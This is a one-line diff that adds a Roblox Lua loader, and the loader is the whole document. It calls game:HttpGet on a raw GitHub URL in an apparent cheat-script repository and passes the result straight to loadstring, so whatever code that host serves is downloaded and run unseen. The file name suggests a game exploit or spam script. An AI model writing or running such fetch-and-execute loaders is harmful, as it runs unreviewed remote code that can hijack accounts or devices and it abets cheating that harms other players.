@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pitroninrank/loaders/main/loaders/megamind-new-potions-crazy-skeleton-rng-spam2-9rcwa80igxp7s8.lua"))()
